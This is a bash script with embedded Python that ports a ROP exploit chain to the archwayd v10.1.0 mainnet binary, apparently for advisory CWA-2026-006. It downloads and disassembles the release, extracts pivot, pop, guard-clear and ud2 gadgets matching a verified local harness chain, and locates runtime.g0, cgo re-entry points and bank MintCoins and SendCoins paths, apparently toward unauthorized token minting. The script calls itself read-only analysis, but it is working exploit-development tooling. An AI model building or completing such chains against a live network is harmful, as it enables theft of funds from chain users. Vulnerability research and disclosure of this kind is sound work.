#!/usr/bin/env bash
# port_analysis.sh — archwayd v10.1.0 native-chain PORT analysis for CWA-2026-006.
#
# Purpose: derive, on the REAL mainnet binary, the address-by-address equivalents of
# the verified local harness chain (harness-vulnerable):
#   harness 0x4d93f8  add rsp,0x150; pop rbp; ret        (pivot)
#   harness 0x437c64  pop rax; ret                        (load runtime.g0)
#   harness 0x2fd1440 runtime.g0                          (data)
#   harness 0x861144  movups xmm15,0x10(rax); ret         (clear g0 guards)
#   harness 0x49b300  runtime.cgocallback.abi0            (Go re-entry)
#   harness 0x1768780 main.mintBridge                     (HARNESS-ONLY, no archwayd equiv)
#   harness 0x4999c8  ud2                                 (terminal landing)
#
# READ-ONLY static analysis. No chain interaction, no keys, no deployment.
# Heavy (105 MB download + ~15 min objdump) -> runs on GitHub Actions only.
set -uo pipefail
cd "$(dirname "$0")/../.."       # -> archway/  (script lives in archway/live/ci/)
ROOT="$PWD"                       # archway/
OUT="$ROOT/ci-out/port"
mkdir -p "$OUT"

ARCHWAYD=/tmp/archwayd
URL="https://github.com/archway-network/archway/releases/download/v10.1.0/archwayd_linux_amd64"

echo "=== [1/7] fetch archwayd v10.1.0 (cached) ==="
fetch_archwayd() {
  for try in 1 2 3 4 5; do
    curl -sL --max-time 1800 -o "$ARCHWAYD" "$URL" || true
    if [ -s "$ARCHWAYD" ] && [ "$(head -c 4 "$ARCHWAYD" | od -An -tx1 | tr -d ' ')" = "7f454c46" ]; then
      return 0
    fi
    echo "  fetch attempt $try failed (size=$(stat -c%s "$ARCHWAYD" 2>/dev/null || echo 0)); retrying..." >&2
    rm -f "$ARCHWAYD"; sleep 15
  done
  return 1
}
if [ ! -s "$ARCHWAYD" ] || [ "$(head -c 4 "$ARCHWAYD" | od -An -tx1 | tr -d ' ')" != "7f454c46" ]; then
  fetch_archwayd || { echo "FATAL: archwayd download failed after retries"; exit 1; }
fi
if [ ! -s "$ARCHWAYD" ]; then echo "FATAL: archwayd unavailable"; exit 1; fi
sha256sum "$ARCHWAYD" | tee "$OUT/port_archwayd.sha256"
{ file "$ARCHWAYD"; readelf -h "$ARCHWAYD" 2>/dev/null | grep -E "Type:|Entry point|Machine:"; } | tee "$OUT/port_archwayd_info.txt"

echo "=== [2/7] pclntab function inventory ==="
( cd "$ROOT/mint/e8/pclntab_dump" && go build -o /tmp/pclntab_dump . ) 2>"$OUT/pclntab_build.err" || true
FNS="$OUT/port_functions.txt"
timeout 1200 /tmp/pclntab_dump "$ARCHWAYD" > "$FNS" 2>"$OUT/pclntab_dump.err" || true
echo "functions: $(wc -l < "$FNS" 2>/dev/null || echo 0)"

echo "=== [3/7] GNU objdump (cached, ~15 min first time) ==="
ASM=/tmp/archwayd.asm
if [ ! -s "$ASM" ]; then
  timeout 3000 objdump -d "$ARCHWAYD" > "$ASM" 2>/dev/null || true
fi
echo "objdump lines: $(wc -l < "$ASM" 2>/dev/null || echo 0)"

echo "=== [4/7] targeted function disassembly (Go runtime re-entry + mint path) ==="
python3 "$ROOT/mint/e8/fn_disasm.py" "$ASM" "$FNS" \
  '^runtime\.rt0_go$' '^runtime\.mstart0$' '^runtime\.mstart1$' '^runtime\.mstartm0$' \
  '^runtime\.needm$' '^runtime\.needAndBindM$' '^runtime\.cgocallback$' '^runtime\.cgocallbackg$' \
  '^runtime\.cgocallbackg1$' '^runtime\.morestack$' '^runtime\.morestack_noctxt$' \
  '^runtime\.asmcgocall$' '^crosscall2$' '^runtime/cgo\.set_crosscall2$' \
  'x/bank/keeper\.\(\*BaseKeeper\)\.MintCoins' 'x/bank/keeper\.BaseKeeper\.MintCoins' \
  'x/bank/keeper\.BaseSendKeeper\.addCoins' 'x/bank/keeper\.BaseSendKeeper\.setBalance' \
  'x/bank/keeper\.\(\*BaseKeeper\)\.SendCoinsFromModuleToAccount' \
  'x/rewards/mintbankkeeper' \
  > "$OUT/port_target_disasm.txt" 2>"$OUT/port_disasm.err" || true
wc -l "$OUT/port_target_disasm.txt" | tee -a "$OUT/port_archwayd_info.txt"

echo "=== [5/7] runtime.g0 candidate (absolute g0/m0 references in rt0_go / mstart) ==="
{
  echo "## rt0_go / mstart0 / mstart1 / needm absolute symbol refs (g0/m0 candidates)"
  grep -nE 'lea|mov[a-z]*[[:space:]]+\$0x|# 0x' "$OUT/port_target_disasm.txt" \
    | grep -E 'lea|\\\$0x|# 0x' | head -120
  echo
  echo "## raw rt0_go block"
  sed -n '/^########## runtime\.rt0_go /,/^########## /p' "$OUT/port_target_disasm.txt" | head -60
} | tee "$OUT/port_g0_candidates.txt"

echo "=== [6/7] gadget extraction (pivot / pop / guard-clear / ud2) ==="
python3 - "$ASM" "$OUT/port_gadgets.txt" <<'PYEOF'
import re, sys
asm, outp = sys.argv[1], sys.argv[2]
# collect instruction stream (address, text), and detect gadgets across <=6 insn windows
insn = []
rx = re.compile(r'^\s*([0-9a-f]+):\t([0-9a-f ]+)\t(.*)$')
with open(asm, errors='replace') as f:
    for line in f:
        m = rx.match(line)
        if m:
            insn.append((int(m.group(1),16), m.group(3).strip()))
print(f"# parsed {len(insn)} instructions", file=sys.stderr)

buckets = {
  'PIVOT_exact_add_rsp_150_pop_rbp_ret': re.compile(r'^add\s+\$0x150,%rsp$'),
  'POP_rax_ret':  re.compile(r'^pop\s+%rax$'),
  'POP_rbx_ret':  re.compile(r'^pop\s+%rbx$'),
  'POP_rbp_ret':  re.compile(r'^pop\s+%rbp$'),
  'PIVOT_mov_rsp': re.compile(r'^mov\s+%(rsi|rbx|rbp),%rsp$'),
  'PIVOT_lea_rbp': re.compile(r'^lea\s+-0x[0-9a-f]+\(%rbp\),%rsp$'),
  'LEAVE_ret': re.compile(r'^leave$'),
  'GUARD_clear_movups': re.compile(r'^movups\s+%xmm[0-9]+,\s*0x10\(%r[a-z0-9]+\)$'),
  'GUARD_clear_movq0': re.compile(r'^movq\s+\$0x0,\s*0x10\(%r[a-z0-9]+\)$'),
  'XOR_zero_xmm': re.compile(r'^(xorps|xorpd|pxor)\s+%xmm'),
  'UD2': re.compile(r'^ud2'),
  'JMP_indirect': re.compile(r'^jmp\s+\*'),
  'CALL_indirect': re.compile(r'^call\s+\*'),
}
hits = {k: [] for k in buckets}
N = len(insn)
for i,(a,t) in enumerate(insn):
    for k,rx2 in buckets.items():
        if rx2.match(t):
            # capture the following up to 4 instructions to see if a ret closes it
            window = []
            for j in range(i, min(i+5, N)):
                window.append(insn[j][1])
                if insn[j][1] == 'ret':
                    break
            hits[k].append((a, ' ; '.join(window)))
with open(outp,'w') as o:
    for k in buckets:
        lst = hits[k]
        o.write(f"== {k} ({len(lst)}) ==\n")
        for a,w in lst[:60]:
            o.write(f"0x{a:x} | {w}\n")
        o.write("\n")
print("written", outp, file=sys.stderr)
PYEOF
grep -c '^==' "$OUT/port_gadgets.txt" | tee -a "$OUT/port_archwayd_info.txt"

echo "=== [6b/7] exact-string greps for the harness gadget shapes ==="
{
  echo "## add \$0x150,%rsp ; pop %rbp ; ret   (harness 0x4d93f8 pivot)"
  grep -n -B0 -A2 -E '^[[:space:]]*[0-9a-f]+:.*add[[:space:]]+\$0x150,%rsp' "$ASM" | grep -A2 'add' | grep -B1 -A1 'pop.*%rbp' | head -20
  echo "## movups %xmmN,0x10(%rXX) ; ret   (harness 0x861144 guard clear)"
  grep -n -A1 -E 'movups[[:space:]]+%xmm[0-9]+,[[:space:]]*0x10\(%r' "$ASM" | grep -B1 'ret' | head -20
  echo "## any ud2 (0f 0b)"
  grep -n -E '^[[:space:]]*[0-9a-f]+:.*\bud2\b' "$ASM" | head -10
} | tee "$OUT/port_gadget_greps.txt"

echo "=== [6c/7] runtime.g0 / runtime.m0 resolution (asm TEXT entries are mis-delimited in the pclntab) ==="
{
  echo "## ELF entry stub (_rt0_amd64_linux @0x44f889) and its jmp/call target"
  objdump -d --start-address=0x44f880 --stop-address=0x44f930 "$ARCHWAYD" 2>/dev/null
} > "$OUT/port_entry_stub.txt" 2>&1
RT0=$(grep -oE '(jmp|call)[[:space:]]+0x[0-9a-f]+' "$OUT/port_entry_stub.txt" | tail -1 | grep -oE '0x[0-9a-f]+')
echo "entry-stub jump target (rt0_go candidate): ${RT0:-none}" | tee "$OUT/port_g0.txt"
for A in "$RT0" 0x4cb2c0 0x3644f80 0x47c940; do
  [ -z "$A" ] && continue
  echo "## region @$A" | tee -a "$OUT/port_g0.txt"
  objdump -d --start-address="$A" --stop-address=$((A + 0x400)) "$ARCHWAYD" 2>/dev/null > "$OUT/port_rt0go_$A.txt"
  grep -nE 'lea|mov[a-z]*[[:space:]]+\$0x6' "$OUT/port_rt0go_$A.txt" | grep -E '# 0x6|\$0x6' | head -20 | tee -a "$OUT/port_g0.txt"
done
# Global: any absolute immediate load of a plausible global in the 0x66..0x6c range
echo "## absolute global immediates (mov \$0x6...,%rXX) — first 40" | tee -a "$OUT/port_g0.txt"
grep -nE 'mov[a-z]*[[:space:]]+\$0x6[0-9a-f]{6},%r' "$ASM" | head -40 | tee -a "$OUT/port_g0.txt"

echo "=== [7/7] mint-path + itab + wasmvm symbol presence ==="
{
  echo "## mint candidates (bank/mint/mintbankkeeper)"
  grep -Ei '(MintCoins|SendCoins|BurnCoins|AddCoins|InputOutputCoins|SetBalance|SendCoinsFromModule|SendCoinsFromAccount)' "$FNS" | grep -Ei 'bank|mint' | head -60
  echo
  echo "## itab hunt (go:itab.Context,context.Context)"
  python3 "$ROOT/mint/e8/itab_hunt.py" "$ARCHWAYD" "$OUT/port_itab.txt" 2>&1 | tail -20
  echo
  echo "## wasmvm / cgo export symbols present in archwayd"
  grep -Ei 'wasmvm/internal/api\.(cGet|cSet|cDelete|cQueryExternal)|_cgoexp_.*_(cSet|cGet|cQueryExternal)|crosscall2$|runtime\.cgocallback' "$FNS" | head -40
  echo
  echo "## sdk.Context methods (for the borrow-a-context analysis)"
  grep -Ei 'cosmos-sdk/types\.Context\.(KVStore|Value|CacheContext)|types\.\(\*Context\)\.(KVStore|CacheContext)' "$FNS" | head -20
} | tee "$OUT/port_mint_itab.txt"

echo "=== outputs ==="
ls -la "$OUT"
exit 0
